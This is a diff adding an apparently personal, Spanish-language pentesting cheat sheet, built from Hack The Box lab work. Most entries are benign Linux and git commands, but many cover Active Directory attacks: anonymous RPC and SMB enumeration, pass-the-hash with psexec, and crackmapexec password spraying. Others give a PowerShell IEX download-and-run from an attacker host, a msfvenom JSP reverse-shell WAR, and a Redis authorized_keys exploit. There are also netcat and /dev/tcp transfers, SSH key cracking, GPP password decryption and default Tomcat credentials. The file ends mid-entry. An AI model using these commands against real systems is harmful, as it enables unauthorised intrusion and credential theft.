@@ -1,0 +1,1092 @@
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Inicio de sesion anonimo
+Comando: rpcclient -U "" -N <ip>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Iniciar sesion mediante RPC
+Comando: rpcclient -U "user%password" <ip> 
+-------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Enumeracion de usuarios  
+Comando: rpcclient -U "" -N <ip> -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v -E '0x|DefaultAccount|Guest' | sort -u |  tr -d '[]' 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Enumeracion de grupos 
+Comando: rpcclient -U "user%password" <ip> -c "enumdomgroups"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Consultas a usuarios
+Comando: rpcclient -U "user%password" <ip> -c "queryuser user1"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Ver a que grupo pertenece un usuario 
+Comando: rpcclient -U "" -N 10.10.10.161 -c "queryusergroups 0x47b"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Obtener informacion del dominio
+Comando: rpcclient -U "user%password" -c "querydominfo"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Enumeracion de privilegios
+Comando: rpcclient -U "user%password" <ip> -c "enumprivs"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Enumeracion de carpetas compartidas
+Comando: rpcclient -U "user%password" <ip> -c "netshareenum/netshareenumall"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Enumeracion de dominios
+Comando: rpcclient -U "user%password" <ip> -c "enumdomains"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Enumeracion de usuarios y su descripcion
+Comando: rpcclient -U "user%password" <ip> -c "querydispinfo"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "GetADUsers" 
+Descripcion: Enumeracion de usuarios
+Comando: GetADUsers.py-all <dominio>/user:password -dc-ip <ip>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "iwr" 
+Descripcion: Descargar un documento de otra computadora
+Comando: iwr http://10.10.14.65:8000/winPEAS.exe -outf .\winPEAS.exe / IEX(New-Object Net.WebClient).downloadString('http://10.10.14.65/PowerView.ps1')
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "Get-ADDomain"
+Descripcion: Obtener informacion del dominio
+Comando: Get-ADDomain  <domain.local>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "dir"
+Descripcion: Listar directorios ocultos
+Comando: dir -Force / Get-ChildItem -Force
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "whoami"
+Descripcion: Revisar los privilegios del usuario
+Comando: whoami /all
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "net" 
+Descripcion: Obtener informacion de un usuario
+Comando: net user <user_name>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "net"
+Descripcion: Obtener informacion de un grupo
+Comando: net group <group_name> net localgroup <group_name>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "net"
+Descripcion: Enumeracion de grupos 
+Comando: net localgroup
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "whoami"
+Descripcion: Enumerar los privilegios de mi usuario
+Comando: whoami /priv
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "dir"
+Descripcion: Busqueda recursiva
+Comando: dir | Select-string "Password"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "dir"
+Descripcion: Busqueda de archivos especificos
+Comando: dir /s /r file.txt
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Web"
+Protocolo: "Python"
+Herramienta: "Python"
+Descripcion: Levantar un servidor temporal
+Comando: python -m SimpleHTTPServer 1818 / python -m http.server 1234
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "xdd"
+Descripcion: Revertir una cadena en hexadecimal
+Comando: echo “cadena” | xxd -ps -r; echo
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "cat"
+Descripcion: Consultar el algoritmo de hash utilizado por el sistema
+Comando: cat /etc/login.defs | grep "ENCRYPT_METHOD"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "bash"
+Descripcion: Obtener una shell de bash
+Comando: /bin/bash -i
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "cat"
+Descripcion: Ver los usuarios del sistema
+Comando: cat /etc/passwd | grep "sh$"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "script"
+Descripcion: Obtener una pseudo terminal
+Comando: script /dev/null -c bash
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "cp"
+Descripcion: Copiar el resultado de la ejecucion de un comando anterior
+Comando: cp $(!!) /root/Documentos
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "ps"
+Descripcion: Listar todos los comandos que se estan ejecutando actualmente
+Comando: ps -eo command
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "wget"
+Descripcion: Traer archivos de un servidor temporal
+Comando: wget http://10.10.10.10/archivo 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "find"
+Descripcion: Buscar cualquier archivos y directorios desde la ruta donde me encuentro
+Comando: find .
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "find"
+Descripcion: Buscar solo archivos desde la ruta donde me encuentro
+Comando: find . -type f
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "find"
+Descripcion: Mostrar archivos de forma tabulada (ruta absoluta, propietario, grupo, permisos)
+Comando: find . -type f -printf "%f\t%p\t%u\t%g\t%m\n" | column -t 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "xargs"
+Descripcion: Ejecutar comandos sobre el output de un comando anterior
+Comando: find . -type f | xargs cat
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "find"
+Descripcion: Buscar unicamente los archivos legibles
+Comando: find . -type f -readable
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "find"
+Descripcion: Buscar archivos con un tamano en especifico
+Comando: find . type f -size 1003c
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "find"
+Descripcion: Buscar archivos con propietarios y grupos en especifico
+Comando: find . -type f -user srp3rr1n -group root
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: find
+Descripcion: Buscar llaves RSA
+Comando: find / -name id_rsa 2> /dev/null 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux" 
+Protocolo: "Comandos"
+Herramienta: "find"
+Descripcion: Buscar archivos donde yo sea el propietario
+Comando: find / -user svc_acc 2>/dev/null | grep -vE “proc|run|var|sys|home”
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "awk"
+Descripcion: Filtrar texto 
+Comando: awk '/millionth/' data.txt
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "awk"
+Descripcion: Filtar por argumentos, es cuestion de cambiar el numero para mostrar el argumento que queramos $1,$2,$3
+Comando: awk '/millionth/' data.txt | awk '{print $1}'
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "awk"
+Descripcion: Filtar el ultimo campo de una linea
+Comando: awk '/millionth/' data.txt | awk 'NF{print $NF}'
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "awk" 
+Descripcion: Filtra el primer argumento teniendo en cuenta como delimitador los :
+Comando: awk '{print $1}'  FS=":"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "awk" 
+Descripcion:  Filtrar por numero de lineas (En este caso filtro por la linea 2)
+Comando: awk  'NR==2'
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "awk"
+Descripcion:  Filtrando haciendo selecciones (imprime desde name: Forge hasta resuelta:
+Comando: awk "/name: \"Forge\"/, /resuelta:/"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "sed"
+Descripcion: Reemplazar todos los : por la palabara test  
+Comando: sed 's/:/test/' 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "sort"
+Descripcion: Ordenar las lineas de un archivo 
+Comando: sort
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "sort"
+Descripcion: Mostrar informacion unica de un archivo (Evitando repeticiones)
+Comando: sort -u              
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "mktemp"
+Descripcion: Crear una carpeta temporal
+Comando: mktemp              
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "netcat"
+Descripcion: Enviar texto por netcat
+Comando: echo "texto" | nc localhost 3000              
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux" 
+Protocolo: "Comandos"
+Herramienta: "xxd"
+Descripcion: Revertir un archivo hexadecimal
+Comando: xxd -ps -r
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "7z"
+Descripcion: Descompresor universal
+Comando: 7z
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "7z"   
+Descripcion: Descompresor universal - Listar el contenido del archivo
+Comando: 7z l        
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "7z"  
+Descripcion: Extraer el contenido de un archivo
+Comando: 7z x <file>        
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "tar"
+Descripcion: Descomprimir archivos .tar
+Comando: tar -xvf archivo.tar
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "tar"
+Descripcion: Descomprimir archivos .tgz
+Comando: tar -xvzf archivto.tgz
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "bzip"
+Descripcion: Descomprimir archivos .bz2
+Comando: bzip2 -d archivo.bz2
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "tar"
+Descripcion: Descomprimir archivos .tar.bz2
+Comando: tar jxvf archivo.tar.bz2
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "gzip"
+Descripcion: Descomprimir archivos .gz
+Comando: gzip gzip -d archivo.gz
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "tar"
+Descripcion: Descomprimir archivos .tar.gz
+Comando: tar zxf archivo.tar.gz
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "rar"
+Descripcion: Descomprimir archivos .rar
+Comando: rar x archivo.rar
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Descompresion de archivos"
+Protocolo: "Comandos"
+Herramienta: "unzip"
+Descripcion: Descomprimir archivos .zip
+Comando: unzip archivo.zip
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Bash"
+Protocolo: "Comandos"
+Herramienta: "bash"
+Descripcion: Ejecutar un script   
+Comando: bash script.sh / ./script.sh 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "Comandos"
+Herramienta: "base64"
+Descripcion: Traer un documento de un host remoto a mi host local 
+Comando: 
+1- export TERM=xterm 
+2- base64 -w 0 archivo.sh copiar el base64 
+3- En mi host echo 'codigo_en_base64' | base64 -d > nombre_archivo.sh
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Numeros magicos"
+Protocolo: "Comandos"
+Herramienta: "bash"
+Descripcion: Numero magico de GIF
+Comando: Colocar antes del texto GIF89
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "touch"
+Descripcion: Crear un mismo en diferentes carpetas al mismo tiempo                                
+Comando: touch {/root/Documentos/HTB/machines/Sizzle/smbmounted/ZZ_ARCHIVE/,./}name_file.txt
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Linux"
+Protocolo: "Comandos"
+Herramienta: "bash"
+Descripcion: Crear un archivo con mutiples extensiones
+Comando: file_name.{exe,dll,scf}
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Scan"
+Protocolo: "TCP"
+Herramienta: "nmap" 
+Descripcion: Descubrimiento de host activos en la red
+Comando: nmap -sn -Pn -vvv  [IP/mascara] --traceroute -oA HOST_DISCOVERY
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Scan"
+Protocolo: "TCP"
+Herramienta: "nmap" 
+Descripcion: SYN Scan            
+Comando: nmap -sS -p- 10.10.10.10 -vvv -Pn -n -oA TCP_SCAN_10.10.10.10
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Scan"    
+Protocolo: "TCP" 
+Herramienta: "nmap"   
+Descripcion: Escaneo de versiones
+Comando: nmap -sV -p22,80 10.10.10.10 -vvv -Pn -O -oA TCP_SCAN_SV_10.10.10.10
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Scan"
+Protocolo: "TCP"
+Herramienta: "nmap" 
+Descripcion: Escaneo de versiones y scripts de vulns
+Comando: nmap -sVC -p22,80 10.10.10.10 -vvv -Pn -oA TCP_SCAN_SVC_10.10.10.10
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Scan"
+Protocolo: "UDP"
+Herramienta: "nmap" 
+Descripcion: Escaneo UDP
+Comando: nmap -sU -sV --top-ports 500 10.10.10.10 -vvv --open -oA UDP_SCAN_SV_10.10.10.10
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Scan"
+Protocolo: "TCP"
+Herramienta: "nmap"
+Descripcion: Script para escanear multiples IP
+Comando: 
+#!/bin/bash
+while read line 
+do
+	nmap -Pn -sS -p- -n --reason -vvv $line -oA TCP_SCAN_NF_$line
+done < infra_externa.txt
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Scan"
+Protocolo: "TCP"
+Herramienta: "nmap"
+Descripcion: Ver las categorias de los scripts de nmap 
+Comando: locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "SSH"
+Herramienta: "scp"
+Descripcion: Copiar archivos de una maquina remota a una maqui local 
+Comando: scp user@10.10.10.10:/home/user/* .
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SSH"
+Protocolo: "SSH"
+Herramienta: "SSH"
+Descripcion: Conectarme por ssh con llave privada
+Comando: ssh ivan@10.10.10.10 -i id_rsa
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SSH"                     
+Protocolo: "SSH"  
+Herramienta: "john"
+Descripcion: Romper la contraseña de llave de ssh
+Comando: 
+1- python ssh2john.py id_rsa > id_rsa.txt - Pasar la llave a un formato que john pueda reconocer     
+2- john id_rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt - Sintaxis normal de john para que pueda romperla
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SSH"
+Protocolo: "SSH"
+Herramienta: "ssh-keygen"
+Descripcion: Generar par de llaves asimetricas para ssh 
+Comando: ssh-keygen -t rsa
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbcacls"
+Descripcion: Listar los permisos de un recurso con smbcalcs 
+Comando:
+for file in $(ls); do echo $file; done | grep -v -i "^ntuser" | while read line; do echo -e "\n[*] $line:\n"; smbcacls //10.10.10.40/Users Default/$line -N | grep -i "everyone"; done 
+smbcacls //10.10.10.10/Recurso_Compartido dominio -U 'usuario%contraseña'
+Ejemplo: smbcacls //10.10.10.100/Replication active.htb -U 'SVC_TGS%GPPstillStandingStrong2k18'
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: smb"
+Descripcion: Ver los permisos reales de los recursos compartidos
+Comando:
+find . -type d | while read directory; do 
+> touch ${directory}/srp3rr1n 2>/dev/null  && echo "${directory} - Archivo creado" && rm ${directory}/srp3rr1n 
+> mkdir ${directory}/srp3rr1n 2>/dev/null  && echo "${directory} - Directorio creado" && rmdir ${directory}/srp3rr1n
+> done
+NOTA:  Intentaremos crear un archivo y directorio en cada directorio del recurso compatido para ver en donde tenemos permisos de escritura y nos muestre en cual directorio se puede.
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbcacls"
+Descripcion: Listar los permisos de un recurso con smbcalcs
+Comando:
+for file in $(ls); do echo $file; done | grep -v -i "^ntuser" | while read line; do echo -e "\n[*] $line:\n"; smbcacls //10.10.10.40/U>
+smbcacls //10.10.10.10/Recurso_Compartido dominio -U 'usuario%contraseña'
+Ejemplo: smbcacls //10.10.10.100/Replication active.htb -U 'SVC_TGS%GPPstillStandingStrong2k18'
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbclient"
+Descripcion: Listar de manera recursiva el contenido de los recursos compartidos donde tengo acceso con smbclient
+Comando: smbclient -L 10.10.10.103 -N 2>/dev/null | grep "Disk" | sed 's/\s*\(.*\)\s*Disk.*/\1/' | while read sharedFolder; do echo "===${sharedFolder}==="; smbclient -N "//10.10.10.103/${sharedFolder}" -c dir; echo; done
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbclient"
+Descripcion: Listar recurso compartidos con smbclient cuando se tenga usuario y contraseña 
+Comando: smbclient -L 10.10.10.52 -U james%J@m3s_P@ssW0rd!
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbmap"
+Descripcion: Listar de forma recursiva todos los recursos que estan bajo el dominio que especifiquemos   
+Comando: 
+smbmap -d dominio -H 10.10.10.100 -R recurso_compartido 
+ejemplo: smbmap -d active.htb -H 10.10.10.100 -R Repli 
+smbmap -d active.htb -H 10.10.10.100 -R Replication -A Group.xml -q -> Buscar de forma recursiva pero descargar el archivo Group.xml cuando lo encuentre 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "nullinux"
+Descripcion: Enumeracion de smb con nullinux
+Comando: python /opt/nullinux/nullinux.py 10.10.10.10                                                  
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbget"
+Descripcion: Descargar una carpeta de smb
+Comando:                                                  
+smbget -R  smb://10.10.10.178/Data/ -U TempUser
+1- recurse ON
+2- prompt OFF  -> Para que no pregunte si el recurso me lo quiero pasar o no (para mas comodidad)
+3- mget *
+NOTA: Siempre donde te encuentres intentar un ls ../../../ para ver si puedes listar direcroios mas atras en smb
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "gpp-decrypt"   
+Descripcion: Descifrar una contraseña cpassword de Groups.xml
+Comando: gpp-decrypy edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Pass The Hash"
+Herramienta: "psexec"
+Descripcion: Pass the hash
+Comando: python3 psexec.py Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "crackmapexec"
+Descripcion: Paswword Spry
+Comando: crackmapexec smb 10.10.10.10 -u users.txt -p users.txt --continue-on-success
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"           
+Herramienta: "crackmapexec"
+Descripcion: Validar contraseñas con crackmapexec
+Comando: crackmapexec smb 10.10.10.169 -u 'user' -p 'password'
+NOTA: Siempre que encuentra credenciales validarlas con crackmapexec para ver si corresponde a un usuario
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Password spry" 
+Herramienta: "crackmapexec"
+Descripcion: Password spry
+Comando: crackmapexec smb 10.10.10.0/24 -u ‘<user>’ -p ‘<password>’ -> Cuando tienes credenciales y ver si puedes logearte en otro equipo de la red con esas mismas credenciales.
+NOTA: Siempre que encuentra credenciales validarlas con crackmapexec para ver si corresponde a un usuario
+crackmapexec smb 10.10.10.169 -u ‘users.out’ -p ‘password123!’ -> Cuando quieres ver si una contraseña es valida para algun otro usuario o puede ser en viceversa.
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "SMB"
+Herramienta: "impacket"
+Descripcion: Transferencia de archivos creando un recurso compartido con smb
+Comando: 
+1. impacket-smbserver smbFolder $(pwd) -smb2support
+2. copy Sharphound.exe \\10.10.14.10\smbFolder\Sharphound.exe <- Win to Linux
+3. copy \\10.10.14.4\smbFolder\test.txt . <- Linux to Win 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"             
+Herramienta: "crackmapexec"
+Descripcion: Identificar dominio con crackmapexec
+Comando: crackmapexec smb <ip>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Redis"
+Protocolo: "Redis"
+Herramienta: "nmap"
+Descripcion: Obtener informacion adicional de redis
+Comando: nmap -p 6379 10.10.10.160 --script redis-info
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Redis"
+Protocolo: "Redis"
+Herramienta: "Redis"
+Descripcion: Explotacion de Redis
+Comando: 
+El objetivo es poner una llave asimetrica en la memoria del servidor redis y transferirla a un archivo de manera que el archivo authorized_keys aun sea valido
+
+1. Genrar un par de llaves asimetricas:
+  ssh-keygen -t rsa -C "navihp_ame@hotmail.com"
+2. Rellena la llave publica de ssh con uenas lineas antes y despues del contenido:
+ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
+3. Escribir dentr de la memoria de redis con redis-cli: 
+redis-cli -h 10.10.10.160 flushall
+cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+4.  Colocar el contenido en el archivo authorized_keys:
+redis-cli -h 10.10.10.160 -> Entrar a la interfaz de redis
+192.168.1.11:6379> config get dir
+192.168.1.11:6379> config set dir /Users/antirez/.ssh/
+10.10.10.160:6379> config set dbfilename "authorized_keys"
+192.168.1.11:6379> save
+5.  Colocarme en escuha en un puerto especifico y redirigrime todo lo que me llegue por ese puerto a un archivo (En mi host)
+nc -lvp 8888 > ntds.dit
+2. En la victima conectarme a mi equipo por el puerto especificado y darle como input el archivo
+nc -nlvp 888 < file
+NOTA: Para corroborar que los datos no se corrompieron puede usarse md5sum y comparar los hashes
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "Comandos"
+Herramienta: "netcat"
+Descripcion: Transferenica de archivos mediante netcat 
+Comando: 
+1. nc -nlvp 444 < file.txt (En mi maquina de atacante)
+2. cat > file.txt < /dev/tcp/10.10.10.10/444 (En la maquina victima)
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "SMB"
+Herramienta: "smbserver"
+Desscripcion: Transferir archivos mediante carpeta compartida
+Comando: 
+1. En mi maquina de atacante ejecutar: smbserver.py smbFolder $(pwd) -smb2support 
+2. Copiar el recurso compartido que quiero transferir: copy Sharphound.exe \\10.10.14.10\smbFolder\Sharphound.exe
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "github"
+Protocolo: "github"
+Herramienta: "git"
+Descripcion: Clonar un repositorio 
+Comando: git clone https://github.com/s4vitar/eviltrust
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "github"
+Protocolo: "github"
+Herramienta: "git" 
+Descripcion: Ver los commits de un proyecto
+Comando: 
+git log (Debes estar parado en la carpeta donde teines el repo)
+git show <commit>
+Categoria: github
+Protocolo: github
+Herramienta: git 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "github"
+Protocolo: "github"
+Herramienta: "git"      
+Descripcion: Ver las ramas de un proyecto                          
+Comando: git branch -a
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "github"
+Protocolo: "github"
+Herramienta: "git"
+Descripcion: Cambiarse a otra rama 
+Comando: git checkout <rama>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "github"
+Protocolo: "github"
+Herramienta: "git"
+Descripcion: Ver las etiquetas de un proyecto
+Comando: 
+git tag 
+git show <tag_name>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "github"
+Protocolo: "github"
+Herramienta: "git"
+Descripcion: Agregar un archivo
+Comando: git add -f file.txt
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "github"
+Protocolo: "github"
+Herramienta: "git"
+Descripcion: Crear un commit
+Comando: git commit -m "Name_git"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "github"
+Protocolo: "github"
+Herramienta: "git"
+Descripcion: Subir el commit
+Comando: git push <rama_name>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Tomcat"
+Protocolo: "Tomcat"
+Herramienta: "Tomcat"
+Descripcion: Enumeracion de Tomcat
+Comando:
+\##### Panel de administracion de Tomcat \#####
+/manager/html
+\##### Credenciales por defecto\#####
+ tomcat:s3cret
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Tomcat"
+Protocolo: "Tomcat"
+Herramienta: "msfvenom"
+Descripcion: Crear un war malicioso
+Comando: msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=443 -f war -o shell.war
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "Comandos"    
+Herramienta: "tty"
+Descripcion: Tratamiento de la TTY
+Comando: 
+1. script /dev/null -c bash / python3 -c 'import pty;pty.spawn("/bin/sh")'
+2. CTRL + Z
+3. stty raw -echo; fg
+4. reset
+5. export TERM=xterm
+6. export SHELL=bash
+7. stty rows 40 columns 123
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "WordPress"
+Protocolo: "WordPress"
+Herramienta: "wpscan"
+Descripcion: Enumeracion wordpress
+Comando: wpscan --url http://10.10.110.119/ -e vt,tt,u,ap
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "icmp"
+Herramienta: "tcpdump"
+Descripcion: Validar ejecucion de comandos mediante ping
+Comando: tcpdump -i tun0 icmp -n
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "Comandos"
+Herramienta: "awk"
